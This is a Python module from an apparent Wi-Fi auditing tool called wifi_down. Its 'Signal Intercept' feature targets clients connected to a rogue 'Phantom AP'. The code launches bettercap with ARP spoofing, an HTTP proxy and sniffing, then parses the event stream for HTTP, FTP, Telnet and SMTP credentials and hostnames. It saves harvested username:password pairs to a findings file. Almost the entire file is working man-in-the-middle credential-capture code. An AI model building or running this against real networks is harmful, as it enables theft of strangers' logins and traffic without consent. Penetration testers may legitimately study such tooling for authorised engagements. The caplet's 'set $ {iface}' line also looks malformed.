"""
SIGNAL INTERCEPT — Post-Phantom AP traffic analysis pipeline.

Only available when a client has associated to the Phantom AP.
Uses bettercap internally but wraps it in wifi_down's own session model:
findings are parsed from bettercap JSON events and written to
the active session's findings.json as structured evidence items.

Protocol Fingerprinting: identifies HTTP, HTTPS, SMTP, FTP, Telnet, DNS
and surfaces them as live protocol badges in the status line.
Severity is automatically assigned:
  Telnet / FTP        → Critical (plaintext auth)
  HTTP credentials    → High
  SMTP credentials    → High
  HTTP hostnames      → Informational
"""
from __future__ import annotations

import json
import logging
import os
import re
import subprocess
import tempfile
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional

from rich import box
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

logger = logging.getLogger(__name__)
console = Console()

CAPTURES_DIR = Path("captures")

# ─── Data model ───────────────────────────────────────────────────────────────

SEVERITY_MAP: dict[str, str] = {
    "telnet":   "CRITICAL",
    "ftp":      "CRITICAL",
    "smtp":     "HIGH",
    "http_cred":"HIGH",
    "http_host":"INFORMATIONAL",
    "dns":      "INFORMATIONAL",
    "https":    "INFORMATIONAL",
    "generic":  "LOW",
}

PROTOCOL_BADGES: dict[str, str] = {
    "CRITICAL":      "[bold red]● CRITICAL[/bold red]",
    "HIGH":          "[orange3]● HIGH[/orange3]",
    "INFORMATIONAL": "[dim]● INFO[/dim]",
    "LOW":           "[dim]● LOW[/dim]",
}


@dataclass
class InterceptFinding:
    timestamp:    str
    src_mac:      str
    protocol:     str
    severity:     str
    detail:       str         # credential or hostname
    raw_event:    dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "type":      "intercept",
            "timestamp": self.timestamp,
            "src_mac":   self.src_mac,
            "protocol":  self.protocol,
            "severity":  self.severity,
            "detail":    self.detail,
        }


# ─── bettercap config writer ──────────────────────────────────────────────────

_BETTERCAP_CAPLET = """
set $ {iface}
net.sniff on
net.sniff.verbose true
net.sniff.output /tmp/bcap_wifi_down.json
http.proxy on
http.proxy.sslstrip false
arp.spoof on
"""


def _write_bettercap_caplet(iface: str) -> Path:
    caplet = _BETTERCAP_CAPLET.replace("{iface}", iface)
    p = Path(tempfile.mktemp(suffix=".cap", prefix="intercept_bettercap_"))
    p.write_text(caplet)
    return p


# ─── Event parser ─────────────────────────────────────────────────────────────

def _parse_bettercap_line(line: str) -> Optional[InterceptFinding]:
    """Parse a single bettercap JSON event line into an InterceptFinding."""
    if not line.strip():
        return None
    try:
        evt = json.loads(line)
    except json.JSONDecodeError:
        return None

    ts  = datetime.now().isoformat(timespec="seconds")
    tag = evt.get("tag", "")
    data = evt.get("data", {})

    # HTTP credentials
    if "http.proxy" in tag and ("credentials" in str(data).lower() or
                                 "username" in str(data).lower()):
        src = data.get("client", {}).get("mac", "") or data.get("from", "")
        cred_user = data.get("username") or data.get("user", "")
        cred_pass = data.get("password") or data.get("pass", "")
        detail = f"{cred_user}:{cred_pass}" if cred_user else str(data)[:80]
        return InterceptFinding(ts, src, "http_cred", "HIGH", detail, evt)

    # Hostname sniff
    if "net.sniff" in tag or "dns" in tag.lower():
        src = data.get("client", {}).get("mac", "") or data.get("from", "")
        host = data.get("host") or data.get("hostname") or data.get("query", "")
        if host:
            proto = "dns" if "dns" in tag.lower() else "http_host"
            return InterceptFinding(ts, src, proto, "INFORMATIONAL", str(host), evt)

    # FTP / Telnet / SMTP credential events
    for proto in ("ftp", "telnet", "smtp"):
        if proto in tag.lower():
            src    = data.get("client", {}).get("mac", "") or data.get("from", "")
            detail = data.get("credentials") or data.get("username", "?")
            sev    = SEVERITY_MAP.get(proto, "HIGH")
            return InterceptFinding(ts, src, proto, sev, str(detail), evt)

    return None


# ─── Findings persistence ─────────────────────────────────────────────────────

def _append_to_findings(session_id: str, finding: InterceptFinding) -> None:
    """Append a structured finding to the session's findings.json."""
    sessions_dir = Path.home() / ".wifi-auditor" / "sessions"
    sessions_dir.mkdir(parents=True, exist_ok=True)

    findings_path = sessions_dir / f"{session_id}_findings.json"
    existing: list[dict] = []
    if findings_path.exists():
        try:
            existing = json.loads(findings_path.read_text())
        except Exception:
            existing = []

    existing.append(finding.to_dict())
    findings_path.write_text(json.dumps(existing, indent=2))


# ─── Live status line ─────────────────────────────────────────────────────────

class ProtocolTracker:
    """Track active protocols and render a live badge line."""

    def __init__(self) -> None:
        self._seen: dict[str, int] = {}  # protocol → count

    def record(self, finding: InterceptFinding) -> None:
        self._seen[finding.protocol] = self._seen.get(finding.protocol, 0) + 1

    def badge_line(self) -> str:
        if not self._seen:
            return "[dim]  no traffic yet...[/dim]"
        parts = []
        for proto, cnt in sorted(self._seen.items()):
            sev   = SEVERITY_MAP.get(proto, "generic")
            badge = PROTOCOL_BADGES.get(sev, "")
            parts.append(f"{badge} [dim]{proto.upper()}({cnt})[/dim]")
        return "  ".join(parts)


# ─── bettercap runner ─────────────────────────────────────────────────────────

def _run_bettercap_stream(
    iface: str,
    caplet: Path,
    findings: list[InterceptFinding],
    tracker: ProtocolTracker,
    session_id: str,
    stop_event: threading.Event,
) -> None:
    """Stream bettercap output and parse findings in real-time."""
    import shutil
    if not shutil.which("bettercap"):
        console.print("  [red]bettercap not installed — Signal Intercept unavailable.[/red]")
        console.print("  Install:  sudo apt install bettercap")
        return

    bcap_json_path = Path("/tmp/bcap_wifi_down.json")
    bcap_json_path.unlink(missing_ok=True)

    cmd = ["bettercap", "-iface", iface, "-caplet", str(caplet), "-json"]
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
    except FileNotFoundError:
        console.print("  [red]bettercap binary not found.[/red]")
        return

    logger.info("signal_intercept: bettercap started pid=%d", proc.pid)

    try:
        assert proc.stdout
        for line in proc.stdout:
            if stop_event.is_set():
                break
            finding = _parse_bettercap_line(line)
            if finding:
                findings.append(finding)
                tracker.record(finding)
                sev_color = {"CRITICAL": "bold red", "HIGH": "orange3"}.get(
                    finding.severity, "dim"
                )
                console.print(
                    f"  [{sev_color}][{finding.severity}][/{sev_color}]  "
                    f"[white]{finding.protocol.upper()}[/white]  "
                    f"[cyan]{finding.src_mac or '?'}[/cyan]  "
                    f"[dim]{finding.detail[:60]}[/dim]"
                )
                _append_to_findings(session_id, finding)
                logger.info(
                    "SIGNAL_INTERCEPT proto=%s severity=%s mac=%s",
                    finding.protocol, finding.severity, finding.src_mac,
                )
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
        bcap_json_path.unlink(missing_ok=True)
        caplet.unlink(missing_ok=True)


# ─── CLI entry point ──────────────────────────────────────────────────────────

def intercept_menu(
    interface: str,
    session_id: str,
    phantom_active: bool = False,
) -> list[InterceptFinding]:
    """
    Interactive Signal Intercept launcher.
    Only meaningful after a Phantom AP session has clients connected.
    """
    console.print()
    console.print(Panel(
        "[bold #00D4AA]SIGNAL INTERCEPT[/bold #00D4AA]\n\n"
        "[dim]Post-Phantom AP traffic analysis pipeline.\n"
        "Intercepts and fingerprints protocols from associated clients.\n"
        "Findings are written to the active session's findings.json.[/dim]",
        border_style="#00D4AA",
    ))
    console.print()

    if not phantom_active:
        console.print(Panel(
            "[bold yellow]PREREQUISITE NOT MET[/bold yellow]\n\n"
            "Signal Intercept requires an active Phantom AP session with at least\n"
            "one client associated. Start Phantom AP first (menu option [p]).",
            border_style="yellow",
        ))
        return []

    import shutil
    if not shutil.which("bettercap"):
        console.print("[red]  bettercap is not installed.[/red]")
        console.print("  Install:  sudo apt install bettercap")
        return []

    try:
        ans = input("  Start Signal Intercept on this session? [Y/n]: ").strip().lower()
        if ans not in ("", "y", "yes"):
            return []
    except (KeyboardInterrupt, EOFError):
        return []

    caplet   = _write_bettercap_caplet(interface)
    findings: list[InterceptFinding] = []
    tracker  = ProtocolTracker()
    stop_evt = threading.Event()

    stream_thread = threading.Thread(
        target=_run_bettercap_stream,
        args=(interface, caplet, findings, tracker, session_id, stop_evt),
        daemon=True,
        name="SignalIntercept",
    )
    stream_thread.start()

    console.print()
    console.print(Panel(
        "[bold #00D4AA]SIGNAL INTERCEPT ACTIVE[/bold #00D4AA]\n"
        "[dim]Press Ctrl+C to stop.[/dim]",
        border_style="#00D4AA",
    ))

    try:
        while stream_thread.is_alive():
            time.sleep(2)
            console.print(f"  Protocols: {tracker.badge_line()}", end="\r")
    except KeyboardInterrupt:
        console.print("\n  [yellow]Signal Intercept interrupted.[/yellow]")
    finally:
        stop_evt.set()
        stream_thread.join(timeout=8)

    # Summary
    console.print()
    if findings:
        _display_summary(findings)
    else:
        console.print("  [dim]No findings captured.[/dim]")

    logger.info(
        "SIGNAL_INTERCEPT stopped findings=%d session=%s",
        len(findings), session_id,
    )
    return findings


def _display_summary(findings: list[InterceptFinding]) -> None:
    t = Table(
        title=f"Signal Intercept — {len(findings)} finding(s)",
        box=box.ROUNDED,
        border_style="dim cyan",
        header_style="bold #00D4AA",
    )
    t.add_column("Time",     width=20)
    t.add_column("Protocol", width=12)
    t.add_column("Severity", width=12)
    t.add_column("MAC",      width=18)
    t.add_column("Detail",   width=40)

    sev_colors = {"CRITICAL": "bold red", "HIGH": "orange3", "INFORMATIONAL": "dim"}
    for f in findings[:20]:
        sc = sev_colors.get(f.severity, "dim")
        t.add_row(
            f.timestamp[11:19],
            f.protocol.upper(),
            f"[{sc}]{f.severity}[/{sc}]",
            f.src_mac or "–",
            f.detail[:40],
        )
    console.print(t)
    console.print()
